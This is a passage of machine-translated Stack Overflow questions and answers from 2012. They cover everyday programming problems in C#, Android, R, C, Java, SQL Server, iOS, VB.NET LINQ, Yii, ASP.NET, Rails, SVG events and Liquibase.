[string.Replace](https://docs.microsoft.com/en-us/dotnet/api/system.string.replace)返回一个字符串值。您需要将其分配给您的 html 变量。请注意，它还会替换所有匹配值的出现，这意味着您可能不需要循环。

```
html = html.Replace(ItemMatch.Value, "<h2>My Partial View</h2>"); 
```

> 返回一个新字符串，其中当前实例中出现的所有指定字符串都替换为另一个指定字符串。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-27T15:18:26.023

您没有重新分配给 html

所以：

```
html = html.Replace(ItemMatch.Value, "<h2>My Partial View</h2>"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-27T15:20:33.420

正如其他答案所述，您没有分配结果值。

我要补充一点，您的 foreach 循环没有多大意义，您可以使用内联替换：

```
Regex ItemRegex = new Regex(@"@Html.Partial\(""[a-zA-Z]+""\)", RegexOptions.Compiled);
html = ItemRegex.Replace(html, "<h2>My Partial View</h2>"); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-27T15:21:46.893

这个怎么样？这样您就可以使用匹配项中的值替换为？

然而，最大的问题是您没有将替换结果重新分配给 html 变量。

```
using System;
using System.Text.RegularExpressions;

namespace ConsoleApplication2
{
    class Program
    {
        static void Main(string[] args)
        {
            var html = @"
                            <h1>This is a Title</h1>
                            @Html.Partial(""MyPartialView"")
                        ";

            var itemRegex = new Regex(@"@Html.Partial\(""([a-zA-Z]+)""\)", RegexOptions.Compiled);
            html = itemRegex.Replace(html, "<h2>$1</h2>");

            Console.WriteLine(html);
            Console.ReadKey();
        }
    }
} 
```

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2012-09-27T15:19:39.800

感觉很傻。该字符串是不可变的，因此我需要重新创建它。

```
html = html.Replace(ItemMatch.Value, "<h2>My Partial View</h2>"); 
```

# android - SharedPreferences 与一个类的静态全局变量有何不同？

> ID：12624671
> 
> 赞同：0
> 
> 时间：2012-09-27T15:15:31.847
> 
> 标签：android, sharedpreferences

我已经解释了以下内容`SharedPreferences`，并对他们的能力有所怀疑。这是我发现的：

> Android`SharedPreferences`用于变量的全球化，因此我们可以在整个应用程序中使用`SharedPreferences` 来存储和检索数据，而不是在一个类中定义静态变量，并让该类用于在整个应用程序中检索变量。

有人可以解释这是否正确。如果有我遗漏的主要差异，请告诉我。谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-27T15:18:34.650

保存 sharedpreferences 时，android 系统只是在您的应用程序目录中创建一个新的 xml 文件来保存这些值。因此，如果您的应用程序被杀死，这些变量将被保存。并且变量始终可以从任何活动中读取，因为它们存储在文件中。

存储共享首选项时，您使用密钥（最终静态字符串）稍后访问它们，也许该密钥是他们在谈论静态时的意思

小例子：

静止的：

```
public static final String PREFS_NAME = "settings"
public static final String SILENT_MODE = "silentMode"; 
```

在您的应用程序的任何活动中：

```
SharedPreferences settings = getSharedPreferences(PREFS_NAME, 0);
boolean silent = settings.getBoolean(SILENT_MODE, false); 
```

编辑自：http: [//developer.android.com/guide/topics/data/data-storage.html#pref](http://developer.android.com/guide/topics/data/data-storage.html#pref)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-27T15:23:38.750

您使用 SharedPreferences 来*保存和检索*任何原始数据。与静态变量方法不同，即使您的应用程序被终止，这些数据也会在用户会话中持续存在。

# r - 带有 R 的 csv 数据的 3d 曲面图

> ID：12624675
> 
> 赞同：1
> 
> 时间：2012-09-27T15:15:42.360
> 
> 标签：r, lattice

我正在尝试使用 R 绘制 csv 数据的 3d 曲面图，但我不知道我将如何做到这一点。csv 文件 ( `sphere.csv`) 是

```
0,0,0,0,0,0,0,0,0,0,0
0,0,0,0.447213595,0.565685425,0.6,0.565685425,0.447213595,0,0,0
0,0,0.529150262,0.692820323,0.774596669,0.8,0.774596669,0.692820323,0.529150262,0,0
0,0.447213595,0.692820323,0.824621125,0.894427191,0.916515139,0.894427191,0.824621125,0.692820323,0.447213595,0
0,0.565685425,0.774596669,0.894427191,0.959166305,0.979795897,0.959166305,0.894427191,0.774596669,0.565685425,0
0,0.6,0.8,0.916515139,0.979795897,1,0.979795897,0.916515139,0.8,0.6,0
0,0.565685425,0.774596669,0.894427191,0.959166305,0.979795897,0.959166305,0.894427191,0.774596669,0.565685425,0
0,0.447213595,0.692820323,0.824621125,0.894427191,0.916515139,0.894427191,0.824621125,0.692820323,0.447213595,0
0,0,0.529150262,0.692820323,0.774596669,0.8,0.774596669,0.692820323,0.529150262,0,0
0,0,0,0.447213595,0.565685425,0.6,0.565685425,0.447213595,0,0,0
0,0,0,0,0,0,0,0,0,0,0
0,0,0,0,0,0,0,0,0,0,0 
```

我能够像这样阅读它

```
sphere_data <- read.csv (file="sphere.csv", head=FALSE, sep=",") 
```

然后我尝试使用`wireframe`：

```
library(lattice)
wireframe(z~x+y,sphere_data) 
```

但这给了我一个错误。特别是，口译员似乎对`z`表达的内容感到窒息`z~x+y`。我不知道那个表达是什么意思，但我在互联网上的其他例子中找到了它。

**编辑** 根据*shujaa*的建议，`dput(sphere_data)`返回

```
structure(list(V1 = c(0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L,
0L, 0L), V2 = c(0, 0, 0, 0.447213595, 0.565685425, 0.6, 0.565685425,
0.447213595, 0, 0, 0, 0), V3 = c(0, 0, 0.529150262, 0.692820323,
0.774596669, 0.8, 0.774596669, 0.692820323, 0.529150262, 0, 0,
0), V4 = c(0, 0.447213595, 0.692820323, 0.824621125, 0.894427191,
0.916515139, 0.894427191, 0.824621125, 0.692820323, 0.447213595,
0, 0), V5 = c(0, 0.565685425, 0.774596669, 0.894427191, 0.959166305,
0.979795897, 0.959166305, 0.894427191, 0.774596669, 0.565685425,
0, 0), V6 = c(0, 0.6, 0.8, 0.916515139, 0.979795897, 1, 0.979795897,
0.916515139, 0.8, 0.6, 0, 0), V7 = c(0, 0.565685425, 0.774596669,
0.894427191, 0.959166305, 0.979795897, 0.959166305, 0.894427191,
0.774596669, 0.565685425, 0, 0), V8 = c(0, 0.447213595, 0.692820323,
0.824621125, 0.894427191, 0.916515139, 0.894427191, 0.824621125,
0.692820323, 0.447213595, 0, 0), V9 = c(0, 0, 0.529150262, 0.692820323,
0.774596669, 0.8, 0.774596669, 0.692820323, 0.529150262, 0, 0,
0), V10 = c(0, 0, 0, 0.447213595, 0.565685425, 0.6, 0.565685425,
0.447213595, 0, 0, 0, 0), V11 = c(0L, 0L, 0L, 0L, 0L, 0L, 0L,
0L, 0L, 0L, 0L, 0L)), .Names = c("V1", "V2", "V3", "V4", "V5",
"V6", "V7", "V8", "V9", "V10", "V11"), class = "data.frame", row.names = c(NA,
-12L)) 
```

csv 中的数据有 11x11 个值。这些值应该表示一个点的高度（比如 z 轴）。csv 中第一行的所有值都在同一个 x 轴上，第二行的值也是如此，直到最后一行的值。每行的第一个值在相同的 y 轴上，对于每行的第二个值也是如此，直到最后一行的值。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T17:49:42.153

我只是使用它来工作

```
sphere_data <- as.matrix(sphere_data)
wireframe(sphere_data) 
```

希望有帮助。

# c - 根据字符位置将字符串分成两部分

> ID：12624676
> 
> 赞同：2
> 
> 时间：2012-09-27T15:15:47.530
> 
> 标签：c, string, c-strings

我需要根据字符的位置将字符串拆分为字符串。以便：

str1 = "hello?world" 是 str1 = "hello" 和 str2 = "world"

这是我到目前为止所拥有的：

```
 char    str1[100] = "hello?world";
    char    str2[100];
    char    *p;

    p = strpbrk(str1, "?");
    strcpy(&str2, p);

    strcspn(str1, '?'); 
```

尝试将“p”之后的字符复制到 str2 时出现错误。必须有一种更好和更实用的方法。有人可以帮我吗？非常感谢...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-27T15:23:50.830

`&str2`是指向数组的指针`[100]`。您确实应该使用`str2`. 此外， 的第二个参数`strcspn`应该是`"?"`（以空字符结尾的字符串）而不是`'?'`（单个字符）。
此外，以下代码可以正常工作：

```
#include <stdio.h>
#include <string.h>

char s[] = "hello?world"; /* source string */

char s1[100] = ""; /* first part */
char s2[100] = ""; /* second part */

char *tmp = strchr(s, '?');

if (tmp != NULL) {
    *tmp = '\0';
    strcpy(s1, s);
    strcpy(s2, tmp+1);
}

puts(s1);
puts(s2); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-27T15:23:32.167

这

```
strcspn(str1, '?'); 
```

是一个错误，`strcspn`' 的第二个参数是 a `const char*`，传递一个字符常量几乎肯定会导致未定义的行为和分段错误（您的程序不太可能在其地址空间中有地址 63（'?' 的 ASCII 值） ，如果有，它不太可能指向一个以 0 结尾的字符数组）。

```
p = strpbrk(str1, "?");
strcpy(str2, p+1); 
```

应该工作。如果您想以`str1`“？”结尾，则`*p = 0;`覆盖“？” 使用 0。当然，通常情况下，您应该在使用之前验证它`strpbrk`不会返回。`NULL``p`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-27T15:27:30.820

使用[strtok()](http://www.elook.org/programming/c/strtok.html)。按照链接查看示例。

做这样的事情：

```
 char    src[] = "hello?world";
   char    str1[100];
   char    str2[100];
   char    *p;

   p = strtok(src, "?");
   strcpy(str1, p);

   p = strtok(NULL, "?");
   strcpy(str2, p); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-27T15:29:57.800

我不太了解 stdlib 字符串函数，但您可以这样做（您的字符串将是“安全的”，我的意思是您不必分配太多字节，而只需分配所需的字节，这就是代码会有点长的原因） ：

```
int main()
{
  char *tmp;
  char *s1;
  char *s2;
  char delim;
  int i;
  int j;

  tmp = strdup("hello?world");
  delim = '?';
  i = 0;
  while (s1[i] != delim)
   i++;
  j = 0;
  s1 = malloc(i + 1);
  while (j < i)
   {
    s1[j] = tmp[j];
    j++;
   }
  s1[j + 1] = '\0';
  j = 0;
  i++;
  while (tmp[i])
   {
    i++;
    j++;
   }
  i = strlen(tmp) - j;
  s2 = malloc(j + 1);
  j = 0;
  while (tmp[i])
   {
    s2[j] = tmp[i];
    j++;
    i++;
   }
  s2[j + 1] = '\0';
} 
```

我希望这能帮到您。

# java - 如何以编程方式找出一个字符串可以放入多少个“制表符”？

> ID：12624679
> 
> 赞同：1
> 
> 时间：2012-09-27T15:15:57.953
> 
> 标签：java, alignment

假设我有一个 Java 字符串。

```
"abcdefghijklmnopqrstuvwxyz0123456789...." 
```

有没有办法找出这可以“适合”多少个标签？所以，例如，

如果我打印

```
"\t\t\t\t\t..." 
```

什么时候标签的**视觉**长度会超过字符串？或者换句话说，如何找出制表符空间的长度？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T15:17:53.807

**假设您使用标准的 1 个制表符 = 4 个空格。**

```
String myString = "abcdefghijklmnopqrstuvwxyz0123456789....";

//I'm not sure what you want to do with the extra characters, 
//Just replace round by floor, or ceil if you'd like...
//If you want to floor, then just do: int nbOfVisualTabs = myString.length()/4
int nbOfVisualTabs = Math.round( (double)myString.length()/4.0 ); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T15:22:11.367

选项卡中的“字符”数量各不相同，因此您将无法静态执行此操作。我能想到的唯一方法是实际添加它们，然后测试字符串以查看它是否更长。就像是：

```
while(whateverEventuallyContainsYourString.VisualWidth < yourOtherStringsContainer.VisualWidth) 
{   //Obviously that property doesn't really exist, you'd have to figure something out there.
    myString += "\t";
} 
```

但是在不知道你在什么环境下工作的情况下，我什至不知道如果不设置更多的脚手架这是否可能。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-27T15:18:16.947

Well`String.length()`会给你字符串中的字符数，你需要除以制表符宽度，*通常是*4 或 8。由于制表符宽度通常是用户可配置的，这不是一个好方法。

如果要以固定宽度字体显示，一种选择是打印适当数量的空格字符。如果显示可以是成比例的字体，您将需要想出一些更复杂的东西来对齐元素。

# sql-server-2008 - SQL Server：合并而不是更新

> ID：12624693
> 
> 赞同：0
> 
> 时间：2012-09-27T15:16:47.853
> 
> 标签：sql-server-2008, merge, updates

我正在尝试对只读表进行更新。我收到一条关于仅使用合并的错误消息。大多数在线使用合并和选择等的示例。我正在寻找最简单的更新语句替换 - 我不需要合并整个表等。

```
update table1 set value = 'asdf' where id = 100` 
```

在这种情况下，使用合并来创建一个带有我的“asdf”值的临时表并将其合并到我的目标表中是唯一的方法吗？

另一种解决方案可能涉及删除我的事务的只读属性。我不知道该怎么做。

预先感谢您的任何帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T16:04:01.277

我认为您的问题从这里开始：

> 我正在尝试对只读表进行更新。

无论是复制表还是简单地设置为只读（管理员或管理员级别的用户可以设置），您都无法更新表。

您可以将该表中的数据选择到另一个表中，然后在那里尝试更新。

```
SELECT *
INTO TempTable1
FROM table1

update TempTable1 
set value = 'asdf' 
where id = 100` 
```

您将需要适当的权限才能操作（创建、插入、更新或删除）任何对象。

# java - 用于移动平台浏览器的 Java Applet 的替代品有哪些？混淆的 Javascript 安全吗？

> ID：12624696
> 
> 赞同：0
> 
> 时间：2012-09-27T15:16:50.697
> 
> 标签：java, javascript, mobile, browser, applet

我编写了一个 Java Applet，它加密了一些表单字段，然后在服务器上解密。这在台式计算机上运行良好。但对于平板电脑和移动平台，要么非常有限，要么根本没有支持，尤其是对于 iOS 设备。

是否有任何替代方法可以在移动设备的浏览器中运行代码，以在我的情况下安全地加密表单字段？

我可以用 JavaScript 编写一个加密方案并对 JavaScript 代码进行模糊处理，但这与搜索如何对 JavaScript 代码进行去混淆处理相距甚远。

有人有什么想法吗？

免责声明：我只是信使。我被告知要编写一个小程序，所以我编写了一个小程序。 *他们*不想使用 SSL，并且正在尽其所能避免它。

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T15:53:46.243

好的信使：

那么这不是您需要保护的代码 - 您需要保护您的加密密钥，这意味着使用 PGP（客户端上的公钥，服务器上的私钥）。

不如双向 SSL，所以这取决于您加密的原因。您仍然更容易受到中间人攻击。

如果你想开始在你的服务器上管理这种状态，你总是可以为每个会话生成一个新的 PGP 密钥对。

[http://www.hanewin.net/encrypt/](http://www.hanewin.net/encrypt/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T22:39:49.523

我同意 Lee Kowalkowski 的回答，但我想补充几点：

*   假设您的加密解决方案使用公钥/私钥对并适当保护私钥，那么混淆客户端代码对安全几乎没有任何作用

*   如果您现有的基于 Applet 的解决方案也容易受到反编译，无论您是否混淆。所以你也需要在那里部署公钥/私钥加密。

*   推出自己的解决方案总是有风险的，因为如果你犯了一个错误并构建了一个存在安全漏洞的系统，你可能直到为时已晚才注意到它；即不使用 SSL 是有风险的！

# iphone - 测试多人游戏中心游戏

> ID：12624698
> 
> 赞同：16
> 
> 时间：2012-09-27T15:16:59.093
> 
> 标签：iphone, ios, ios-simulator, game-center

我已经阅读了不同/冲突的答案，我需要一些明确的答案。

我目前正在开发一款基于`Game Center`. 我一直在关注@ [rayWenderlich.com的](http://www.raywenderlich.com/tutorials)[教程](http://www.raywenderlich.com/5509/beginning-turn-based-gaming-with-ios-5-part-2)，并且我已经在模拟器中验证了玩家并且弹出了匹配的视图控制器，但这就是我所掌握的。

所以第一个问题是，

1.  我的代码（通过模拟器）和我的 iPhone 是否可以相互连接/匹配/查找？
    *   我读过这是不可能的，但我确定我看到了一个让他们俩交流的人的 Youtube 视频
2.  您可以仅使用模拟器和 1 台设备测试回合制 Game Center 功能的哪些方面？

* * *

**更新：**

我没想到，经过一番搜索，[我找到了那个 Youtube 视频。](http://www.youtube.com/watch?v=rqGORADIaEs)

也许这是不同的东西，但似乎可以从模拟器匹配/播放，`iOSDevice`然后再返回。这与人们说你不能在这里做的事情相比如何？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-01T17:23:17.660

我最近为 iPhone 制作了一个基于回合的应用程序，我使用我的 iPhone 和计算机上的模拟器对其进行了测试，它工作得很好。您应该记住一件事，那就是您必须在 iPhone 和模拟器上为 GC 使用不同的帐户。

我不太清楚你对问题二的意思，但你可以使用模拟器提供的所有硬件功能，即使你在网上玩。请记住，您不能仅在模拟器上测试程序的多人游戏部分，它必须至少在使用一台设备和模拟器进行测试之间。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-01-15T00:55:29.237

在模拟器和物理设备上进行测试的唯一区别是在模拟器上`GKTurnBasedEventHandler`不起作用。所以这些方法不会在 iOS Simulator 上被调用：

```
-(void)handleInviteFromGameCenter:(NSArray *)playersToInvite
-(void)handleMatchEnded:(GKTurnBasedMatch *)match
-(void) handleTurnEventForMatch:(GKTurnBasedMatch *)match didBecomeActive: (BOOL)didBecomeActive 
```

在使用 an`iOS Simulator`和 a`Device`进行测试时，这些方法将在设备上调用，而不是在模拟器中调用。所以发展起来会很困难。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-02T16:01:06.283

是的，您可以在模拟器和设备之间匹配游戏，我之前已经能够做到，请记住您必须使用两个不同的 Apple/GameCenter 帐户。

根据回合制方面，据我所知，您在寻找什么，在模拟器上您可以在游戏中心方面测试设备上的任何内容，所以我想这将取决于您的后端。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-13T01:53:43.103

如果您使用“自动匹配”，您可以使用模拟器。但是，根据我有限的经验，有些错误会出现在您以前看不到的实际设备上。例如，如果您的代码编写不佳，最终取决于设备的处理速度才能正确执行。

# objective-c - iOS Facebook SDK V3.1 委托方法

> ID：12624700
> 
> 赞同：0
> 
> 时间：2012-09-27T15:17:11.767
> 
> 标签：objective-c, facebook, facebook-ios-sdk

在 Facebook SDK V2 中存在接收信息的委托方法，即当用户注销时`-(void)fbDidLogout`调用委托方法。但是我在 Facebook SDK V3 中找不到任何有关委托方法的信息？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T05:22:42.540

在最新版本的 facebook sdk 中，当单击注销按钮时，我们需要检查一个条件，它将如下所示

```
-(IBAction)buttonClicked:(id)sender {
    // get the app delegate so that we can access the session property
  AppDelegate *appDelegate = [[UIApplication sharedApplication]delegate];

    if (appDelegate.session.isOpen) {
        [appDelegate.session closeAndClearTokenInformation];

    } 
} 
```

这里的 session 是 FBSession 类对象，它是在 Appdelegate 中合成的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T07:41:20.000

通过仔细阅读文档，我了解到 Facebook SDK V3+ 中不再有委托方法

相反，您需要检查方法`FBSessionState`中的枚举`- (void)sessionStateChanged...`。

# audio - 在iOS6中检测静音模式？

> ID：12624703
> 
> 赞同：0
> 
> 时间：2012-09-27T15:17:29.577
> 
> 标签：audio, notifications, ios6

有谁知道这个问题的答案在 iOS6 中是否发生了变化？

[在 iOS5 中检测静音模式？](https://stackoverflow.com/questions/7798891/detect-silent-mode-in-ios5)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T15:25:49.540

Nope. No more AV API for detecting silent switch status.

# vb.net - LINQ - 左连接以查找不匹配的记录

> ID：12624713
> 
> 赞同：0
> 
> 时间：2012-09-27T15:17:49.890
> 
> 标签：vb.net, linq

我正在尝试在 2 个数据表之间执行左连接，这将返回左表中的所有记录，而右表中没有连接条件上的相应值。截至目前，我有以下没有返回任何内容：

```
Dim Query1 = From exasset In dtExistingAssets _
             GroupJoin asset In dtNewAssets _
             On exasset("ACCOUNT_NAME") Equals asset("ACCOUNT_NAME") _
             Into results = Group _
             From f In results.DefaultIfEmpty _
             Where IsDBNull(f) _
             SelectNewWith _
             { //... 
```

我看过几个关于 using 的引用，`Any`但我无法正确获取语法。有人可以帮忙吗？这在 SQL 中很容易完成，但在*LINQ*中似乎要复杂得多。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T15:27:29.590

我会使用强类型的`DataRow`扩展方法，比如[`Field`](http://msdn.microsoft.com/en-us/library/bb360891.aspx)也支持空值。

```
Dim query = From exAsset In dtExistingAssets
        Group Join newAsset In dtNewAssets
        On exAsset.Field(Of String)("ACCOUNT_NAME") Equals newAsset.Field(Of String)("ACCOUNT_NAME") Into Group
        From joinedAssets In Group.DefaultIfEmpty()
        Where joinedAssets.Field(Of String)("ACCOUNT_NAME") Is Nothing 
```

如果您只想了解新帐户，还可以使用高效[`Enumerable.Except`](http://msdn.microsoft.com/en-us/library/bb300779.aspx)：

```
Dim existingAccounts = From exRow In dtExistingAssets
                       Select exRow.Field(Of String)("ACCOUNT_NAME")
Dim newAccounts = From newRow In dtNewAssets
                       Select newRow.Field(Of String)("ACCOUNT_NAME")
Dim newAccNotInExisting = newAccounts.Except( existingAccounts ) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-27T16:48:45.907

我认为问题在于`IsDBNull(f)`，左连接将导致空值（`Nothing`在 VB 中）而不是`DBNull`值。我认为您应该将其更改为：``

```
...
From f In results.DefaultIfEmpty _
Where f is Nothing 
```

# validation - 使用 mimetypes 文件验证时的 yii 不安全属性

> ID：12624717
> 
> 赞同：1
> 
> 时间：2012-09-27T15:17:56.430
> 
> 标签：validation, file-upload, yii, mime-types, runtime-error

我使用以下 mime 类型文件验证

```
 array('image', 'file', 'allowEmpty' => true,'mimeTypes'=>'image/gif, image/jpeg, image/jpg, image/png', 'on' => 'update') 
```

如果文件没有正确的 mime 类型，则效果很好。但如果验证成功，则日志 sais

```
2012/09/27 17:13:02 [warning] [application] unsafe Attribut "image" couldnt be set. 
```

但它肯定被声明为保存

```
array('image', 'safe', 'on' => 'update') 
```

这就是为什么我收到这样的错误

```
finfo_file(C:\xampp\tmp\php3729.tmp): failed to open stream: No such file or directory
$mimeType=finfo_file($info,$file->getTempName()); 
```

似乎，该文件无法保存在其不安全的属性中。奇怪的是，如果我使用 mimeTypes 检查取消注释验证规则，一切正常。

在我的控制器中，我像这样设置图像文件

```
 if (isset($_POST['User'])) {
            $user->attributes = $_POST['User'];
            $user->image = CUploadedFile::getInstance($user, 'image');
            if ($user->validate()) { 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-12-28T16:04:04.727

我相信您`$user->image->saveAs($path)`在保存整个模型之前运行，这就是为什么当它已经移动到 $path 时它会尝试验证临时文件夹中的文件。所以，保存模型后使用`$user->validate()`或运行。`saveAs($path)`

# asp.net - ASP.NET web forms BundleTable is still bundling in debug mode

> ID：12624738
> 
> 赞同：1
> 
> 时间：2012-09-27T15:18:52.513
> 
> 标签：asp.net, asp.net-optimization, bundling-and-minification

I've got an ASP.NET web forms application, running on .NET 4.5 using the new Bundling and Minification features from the Microsoft.AspNet.Web.Optimization package.

So far it's a very simple setup just with a single bundle.

**BundleConfig.cs**

```
public static void RegisterBundles(BundleCollection bundles)
{
    bundles.Add(new ScriptBundle("~/bundles/send").Include(
        "~/scripts/GrowingInput.js", 
        "~/scripts/textboxlist/TextboxList.js",
        "~/scripts/textboxlist/TextboxList.Livesearch.js",
        "~/scripts/combobox/ui.combobox.js",
        "~/scripts/jquery-ui-timepicker.js",
        "~/scripts/msp.send.js"));
} 
```

**Global.asax**

```
protected void Application_Start(object sender, EventArgs e)
{
    BundleConfig.RegisterBundles(BundleTable.Bundles);
} 
```

**Send.aspx**

```
<%: Scripts.Render("/bundles/send") %> 
```

This is always rendered in a web browser as `<script src="/bundles/send"></script>` ignoring whether debug is set to true or false in web.config.

I've tried adding `BundleTable.EnableOptimizations = false;` to BundleConfig.cs to force bundling off but this makes no difference.

Looking to get the following working like it does in MVC sites (Microsoft documentation seems to suggest web forms should be the same).

1.  Get bundling to turn on/off with the debug flag
2.  Append the cache-busting ?v=xxx querystring for versioning.

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-27T22:39:02.993

Bundles paths must start with ~, but the Scripts.Render method is not limited to bundles, so it just treats the url as a local resource, (it uses BundleTable.Bundles.GetBundleFor(path) to determine if the url is a bundle)

You just need to add a ~ like so for this to work: `<%: Scripts.Render("~/bundles/send") %>`

# ruby-on-rails - Ajax 不起作用，什么也不做。回报率

> ID：12624744
> 
> 赞同：0
> 
> 时间：2012-09-27T15:19:21.767
> 
> 标签：ruby-on-rails, ajax

我正在开发一个 ror 网络，我试图 ajaxing 评论。网络上有带有评论的品牌和产品。我首先尝试 ajaxing 品牌的评论。

品牌型号

```
class Brand < ActiveRecord::Base
  attr_accessible :name
  has_many :products, :dependent => :destroy
  has_many :comments, :dependent => :destroy

  validates :name, :presence => true
end 
```

评论的模型

```
class Comment < ActiveRecord::Base
  attr_accessible :body, :brand_id, :product_id, :user_id
  belongs_to :brand
  belongs_to :product

  validates :brand, :presence => {:unless => :product_id?, :message => "The comment must belongs to a brand or product"}
  validates :product, :presence => {:unless => :brand_id?, :message => "The comment must belongs to a brand or product"}
  validates :body, :presence => true
end 
```

评论控制器创建

```
 def create
    @comment = Comment.new(params[:comment])
    @brand = Brand.find(params[:comment][:brand_id])

    respond_to do |format|
      if @comment.save
        @comments = @comment.brand.comments
        format.html { redirect_to @brand, notice: 'Comment was successfully created.' }
        format.json { render json: @comment, status: :created, location: @comment }
        format.js { render @brand}
      else
        format.html { render action: "new" }
        format.json { render json: @comment.errors, status: :unprocessable_entity }
      end
    end
  end 
```

意见/品牌/_comments

```
<div class="well">
  <%= simple_format comments.body %>
  <%= link_to 'Edit', edit_comment_path(comments), :class => 'btn btn-mini btn-success' %>
  <%= link_to 'Destroy', comment_path(comments), :method => :delete, :data => {:confirm => 'Are you sure?'}, :class => 'btn btn-mini btn-danger' %>
</div> 
```

意见/评论/create.js.rjs

```
$("#comments").html("<%= escape_javascript(render :partial => "comments", :collections => @comments) %>"); 
```

浏览量/品牌/展示

```
<h2>Comments</h2>
<div id="comments">
  <%= render :partial => "comments", :collection => @comments %>
</div>
<p></p>

<div id="comment-form">
  <%= form_for @comment, :remote => true do |f| %>
    <%= f.hidden_field :brand_id %>
    <div class="field">
      <%= f.text_area :body, :size => "25x5"%>
    </div>
    <div class="field">
      <%= f.submit 'Enviar comentario', :class => 'btn btn-success' %>
    </div>
  <% end  %>  
</div> 
```

但是当我创建一个新产品时，页面被重新加载。真的很谢谢你！

# html - 几次鼠标按下后，SVG mousemove 事件在 Firefox 中停止触发

> ID：12624745
> 
> 赞同：4
> 
> 时间：2012-09-27T15:19:25.527
> 
> 标签：html, firefox, svg, dom-events, mousemove

我正在编写一个 HTML5 应用程序，主要使用 SVG 内容，在 HTML 页面中。我需要做的其中一项任务是在画布上移动对象。我发现，在 Firefox 中，第一次按下-拖动-释放操作按预期工作，但很快代码在鼠标按下后停止接收 mousemove 事件。相反，我看到了“捉鬼敢死队”光标，好像 Firefox 认为我正在尝试进行拖放操作。通过单击绿色矩形，我最终可以在 mousedown 事件一到两个周期后恢复 mousemove，但随后问题再次出现。我什至设置了 draggable="false"，如下面的简单测试用例所示，以确保禁用 DnD。（所有内容都是从一个文件中复制的，尽管看起来它在这里被分开了。）

此测试用例在 IE9、Chrome、Opera 和 Safari 中运行良好。

一个类似的“纯”SVG 页面可以在 Firefox 和其他浏览器中使用。

我在 Windows 7 客户端上使用 Firefox 15.0.1，从 Linux 机器上提供页面。

有什么我想念的吗？或者这可能是一个 Firefox 错误？

```
<!DOCTYPE HTML5> 
```

```
<title>Test Mouse Events</title>

<script>

function mouseDown(evt)
  {
  document.getElementById("udText").textContent = "mousedown at "+evt.clientX+","+evt.clientY;
  }

function mouseMove(evt)
  {
  document.getElementById("moveText").textContent = "mousemove at "+evt.clientX+","+evt.clientY;
  }

function mouseUp(evt)
  {
  document.getElementById("udText").textContent = "mouseup at "+evt.clientX+","+evt.clientY;
  }

function init()
  {
  document.getElementById("field").addEventListener("mousedown", mouseDown, false);
  document.getElementById("field").addEventListener("mouseup", mouseUp, false);
  document.getElementById("field").addEventListener("mousemove", mouseMove, false);
  }

</script> 
```

```
<svg
  xmlns="http://www.w3.org/2000/svg"
  xmlns:xlink="http://www.w3.org/1999/xlink"
  xmlns:ev="http://www.w3.org/2001/xml-events"
  id="canvas"
  width="800"
  height="600"
  version="1.1"
  baseProfile="full"
  onload="init()"
  >

  <rect id="field" x="50" y="50" width="700" height="500" fill="#20c000" draggable="false"/>
  <text id="udText" x="80" y="520" font-size="30" fill="#000000">No up or down events yet</text>
  <text id="moveText" x="420" y="520" font-size="30" fill="#000000">No move events yet</text>

</svg> 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-27T15:23:58.380

你应该调用 evt.preventDefault(); 在所有 mouseXXX 处理程序中。Firefox 具有默认的拖放处理，而您不希望这样。它不是 Firefox 中的错误。

这些更改为我修复了它：

```
function mouseDown(evt)
  {
  evt.preventDefault();
  document.getElementById("udText").textContent = "mousedown at "+evt.clientX+","+evt.clientY;
  }

function mouseMove(evt)
  {
  evt.preventDefault();
  document.getElementById("moveText").textContent = "mousemove at "+evt.clientX+","+evt.clientY;
  }

function mouseUp(evt)
  {
  evt.preventDefault();
  document.getElementById("udText").textContent = "mouseup at "+evt.clientX+","+evt.clientY;
  } 
```

# mysql - 使用 Liquibase 从 MySQL 表中拆分列

> ID：12624746
> 
> 赞同：0
> 
> 时间：2012-09-27T15:19:26.510
> 
> 标签：mysql, grails, data-migration, liquibase

我有一个包含数据的现有表。

```
foobar_table
    foo
    bar
    baz 
```

我想将该`baz`列从`foobar_table`表中拆分出来并创建一个名为`baz_table`包含它的新表。操作完成后，我将具有以下结构，每列包含操作开始前的数据：

```
foobar_table
    foo
    bar

baz_table
    baz 
```

我怎样才能用[Liquibase](http://www.liquibase.org/)做到这一点？

PS 通过[Grails 数据库迁移插件](http://grails.org/plugin/database-migration)使用 Liquibase 。grailsChange标签给了我希望，但缺乏示例文档让我[很想。](http://grails-plugins.github.com/grails-database-migration/docs/manual/guide/5%20Groovy%20Changes.html)

**更新：**

